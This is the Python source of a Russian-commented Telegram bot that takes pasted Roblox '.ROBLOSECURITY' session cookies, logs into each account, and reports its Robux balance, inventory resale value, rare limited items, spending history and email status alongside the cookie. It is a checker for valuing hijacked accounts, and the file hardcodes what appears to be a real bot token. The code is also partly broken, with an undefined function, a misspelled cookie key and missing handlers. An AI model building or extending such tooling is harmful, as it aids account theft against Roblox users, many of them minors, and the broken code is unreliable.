import telebot
import requests
import io
import re
import zipfile
import json
from datetime import datetime, timedelta
from flask import Flask
from threading import Thread
from collections import defaultdict

# === НАСТРОЙКИ ===
TOKEN = '8526516729:AAHxx09k48kWRk0U7q2AcFSCmEdg3TDcfEw'
bot = telebot.TeleBot(TOKEN)

app = Flask('')
@app.route('/')
def home(): return "Бот активен"

def run(): app.run(host='0.0.0.0', port=8080)
def keep_alive(): Thread(target=run).start()

# Дорогие лимиты для проверки
EXPENSIVE_LIMITEDS = {
    1364898: "Korblox Deathspeaker",
    1364899: "Korblox Deathspeaker (Left)",
    484742933: "Dominus Frigidus",
    62234425: "Headless Horseman",
    251884365: "Valkyrie Helm",
    74626161: "Sparkle Time Fedora"
}

GAME_DATA = {
    "BRAZILIAN SPYDER": {"name": "Steal a brainrot", "universe_id": 6144841331},
    "Uplift Games": {"name": "Adopt me", "universe_id": 231221121},
    "Wave of Brainrots": {"name": "Tsunami brainrots", "universe_id": 6344131331},
    "Nikilis": {"name": "MM2", "universe_id": 66654135},
    "The Garden Game": {"name": "GAG", "universe_id": 5834131131},
    "KizmoTek Studio": {"name": "War tycoon", "universe_id": 2686721523},
    "Gamer Robot Inc": {"name": "Blox fruits", "universe_id": 444227218}
}

def extract_cookie(text):
    match = re.search(r"(_\|WARNING:-DO-NOT-SHARE-THIS\..+)", text)
    return match.group(1).strip() if match else None

def get_extra_info(u_id, cookies):
    """Получение расширенной информации об аккаунте"""
    try:
        u_data = requests.get(f"https://users.roblox.com/v1/users/{u_id}").json()
        reg_dt = datetime.strptime(u_data['created'], "%Y-%m-%dT%H:%M:%S.%fZ")
        days = (datetime.now() - reg_dt).days
        premium = "Да ✅" if u_data.get('hasPremium', False) else "Нет ❌"
        
        # Друзья
        f_data = requests.get(f"https://friends.roblox.com/v1/users/{u_id}/friends/count").json()
        
        # Почта (приблизительная проверка через настройки)
        email_verified = "Неизвестно"
        try:
            settings = requests.get(f"https://accountsettings.roblox.com/v1/email", cookies=cookies).json()
            email_verified = "Да ✅" if settings.get('verified', False) else "Нет ❌"
        except:
            pass
        
        # Регион (по IP)
        region = "Неизвестно"
        try:
            ip_data = requests.get(f"https://www.roblox.com/game/GetCurrentUser.ashx", cookies=cookies).text
            # Парсинг или использование внешнего API для определения региона
        except:
            pass
        
        return {
            'reg_date': reg_dt.strftime("%d.%m.%Y"),
            'age_days': days,
            'premium': premium,
            'friends': f_data.get('count', 0),
            'email': email_verified,
            'region': region
        }
    except:
        return {'reg_date': "??", 'age_days': 0, 'premium': "??", 'friends': 0, 'email': "??", 'region': "??"}

def get_playtime_data(u_id, cookies):
    """Получение времени в играх (через API Badges)"""
    try:
        url = f"https://badges.roblox.com/v1/users/{u_id}/badges?limit=100"
        res = requests.get(url, cookies=cookies, timeout=10).json()
        
        playtime_per_game = defaultdict(int)  # universe_id: minutes
        total_playtime = 0
        
        for badge in res.get('data', []):
            if 'awardedDate' in badge and 'createdDate' in badge:
                awarded = datetime.strptime(badge['awardedDate'], "%Y-%m-%dT%H:%M:%S.%fZ")
                created = datetime.strptime(badge['createdDate'], "%Y-%m-%dT%H:%M:%S.%fZ")
                minutes = (awarded - created).total_seconds() / 60
                universe_id = badge.get('universeId')
                if universe_id and minutes > 0:
                    playtime_per_game[universe_id] += minutes
                    total_playtime += minutes
        
        # Конвертация в читаемый формат
        playtime_readable = {}
        for universe_id, minutes in playtime_per_game.items():
            hours = minutes / 60
            playtime_readable[universe_id] = f"{hours:.1f}ч"
        
        return {
            'total_playtime_hours': total_playtime / 60,
            'playtime_per_game': playtime_readable
        }
    except:
        return {'total_playtime_hours': 0, 'playtime_per_game': {}}

def get_detailed_spending(u_id, cookies):
    """Детализированная статистика донатов"""
    try:
        url = f"https://economy.roblox.com/v2/users/{u_id}/transactions?transactionType=Purchase&limit=100"
        all_transactions = []
        
        while url:
            res = requests.get(url, cookies=cookies, timeout=10).json()
            all_transactions.extend(res.get('data', []))
            next_cursor = res.get('nextPageCursor')
            url = f"https://economy.roblox.com/v2/users/{u_id}/transactions?transactionType=Purchase&limit=100&cursor={next_cursor}" if next_cursor else None
        
        # Анализ по времени
        total_spent_all_time = 0
        spent_last_year = 0
        spent_per_game = defaultdict(int)
        
        one_year_ago = datetime.now() - timedelta(days=365)
        
        for transaction in all_transactions:
            amount = abs(transaction.get('currency', {}).get('amount', 0))
            created = datetime.strptime(transaction['created'], "%Y-%m-%dT%H:%M:%S.%fZ")
            
            total_spent_all_time += amount
            
            if created >= one_year_ago:
                spent_last_year += amount
            
            # Разбивка по играм
            universe_id = transaction.get('details', {}).get('universeId')
            if universe_id:
                game_name = get_game_name(universe_id, cookies)
                spent_per_game[game_name] += amount
        
        return {
            'total_spent_all_time': total_spent_all_time,
            'spent_last_year': spent_last_year,
            'spent_per_game': dict(spent_per_game)
        }
    except:
        return {'total_spent_all_time': 0, 'spent_last_year': 0, 'spent_per_game': {}}

def get_inventory_value(u_id, cookies):
    """Получение RAP и проверка дорогих лимитов"""
    try:
        # Получение инвентаря
        url = f"https://inventory.roblox.com/v2/users/{u_id}/inventory?assetTypes=Collectibles&limit=100"
        res = requests.get(url, cookies=cookies, timeout=10).json()
        
        total_rap = 0
        expensive_items = []
        
        for item in res.get('data', []):
            asset_id = item.get('assetId')
            # Проверка на дорогие лимиты
            if asset_id in EXPENSIVE_LIMITEDS:
                expensive_items.append(EXPENSIVE_LIMITEDS[asset_id])
            
            # Получение RAP
            try:
                rap_url = f"https://economy.roblox.com/v1/assets/{asset_id}/resale-data"
                rap_data = requests.get(rap_url, cookies=cookies, timeout=5).json()
                total_rap += rap_data.get('price', 0)
            except:
                pass
        
        return {
            'total_rap': total_rap,
            'expensive_items': expensive_items,
            'has_korblox': any("Korblox" in item for item in expensive_items)
        }
    except:
        return {'total_rap': 0, 'expensive_items': [], 'has_korblox': False}

def get_game_name(universe_id, cookies):
    """Получение названия игры по universe_id"""
    try:
        url = f"https://games.roblox.com/v1/games?universeIds={universe_id}"
        res = requests.get(url, cookies=cookies, timeout=5).json()
        return res['data'][0]['name'] if res.get('data') else f"Universe_{universe_id}"
    except:
        return f"Universe_{universe_id}"

def check_cookie(raw_text):
    """Основная функция проверки куки с расширенными данными"""
    cookie = extract_cookie(raw_text)
    if not cookie:
        return {"status": "error"}
    
    cookies = {".ROBLOSECURITY": cookie}
    
    try:
        # Базовая информация
        u_req = requests.get("https://users.roblox.com/v1/users/authenticated", cookies=cookies, timeout=10)
        if u_req.status_code != 200:
            return {"status": "error"}
        
        u = u_req.json()
        u_id, u_name = u['id'], u['name']
        
        # Расширенная информация
        extra_info = get_extra_info(u_id, cookies)
        
        # Баланс
        robux_data = requests.get(f"https://economy.roblox.com/v1/users/{u_id}/currency", cookies=cookies).json()
        robux = robux_data.get('robux', 0)
        
        # Созданные игры
        created_games = get_created_places(u_id)
        
        # Время в играх
        playtime_data = get_playtime_data(u_id, cookies)
        
        # Детализированные донаты
        spending_data = get_detailed_spending(u_id, cookies)
        
        # RAP и лимиты
        inventory_data = get_inventory_value(u_id, cookies)
        
        return {
            "status": "ok",
            "name": u_name,
            "id": u_id,
            "robux": robux,
            **extra_info,
            "created_games": created_games,
            **playtime_data,
            **spending_data,
            **inventory_data,
            "cookie": cookie
        }
    except Exception as e:
        print(f"Error in check_cookie: {e}")
        return {"status": "error"}

def format_output(res):
    """Форматирование вывода с расширенными данными"""
    # Основная информация
    games_str = "\n • " + "\n • ".join(res['created_games']) if res['created_games'] else "Нет созданных игр"
    
    # Время в играх
    playtime_str = f"{res['total_playtime_hours']:.1f} часов"
    if res['playtime_per_game']:
        playtime_str += "\nДетали по играм:\n"
        for game_id, time in list(res['playtime_per_game'].items())[:10]:  # Ограничим вывод
            playtime_str += f"   • {get_game_name(game_id, {'._ROBLOSECURITY': res['cookie']})}: {time}\n"
    
    # Донаты
    spent_games_str = ""
    if res['spent_per_game']:
        for game, amount in sorted(res['spent_per_game'].items(), key=lambda x: x[1], reverse=True)[:10]:
            spent_games_str += f"   • {game}: {amount} R$\n"
    
    # Дорогие лимиты
    limiteds_str = ", ".join(res['expensive_items']) if res['expensive_items'] else "Нет"
    
    output = f"""
👤 АККАУНТ: {res['name']} (ID: {res['id']})
🗓 РЕГИСТРАЦИЯ: {res['reg_date']} ({res['age_days']} дн.)
📍 РЕГИОН: {res['region']}
📧 ПОЧТА: {res['email']}
🌟 PREMIUM: {res['premium']}
👥 ДРУЗЕЙ: {res['friends']}
💰 БАЛАНС: {res['robux']} R$
🎮 RAP (стоимость инвентаря): {res['total_rap']} R$

🕐 ВРЕМЯ В ИГРАХ:
Всего: {playtime_str}

💸 ДОНАТЫ:
За всё время: {res['total_spent_all_time']} R$
За последний год: {res['spent_last_year']} R$
По играм:
{spent_games_str}

💎 ДОРОГИЕ ЛИМИТЫ:
{limiteds_str}
{'✅ Есть Korblox' if res['has_korblox'] else '❌ Нет Korblox'}

🛠 СОЗДАННЫЕ ИГРЫ:
{games_str}

🍪 КУКИ:
`{res['cookie']}`

{'='*40}
"""
    return output

# Остальные функции (handle, start и т.д.) остаются без изменений
# ... (предыдущий код обработки сообщений)

if __name__ == '__main__':
    keep_alive()
    bot.infinity_polling()
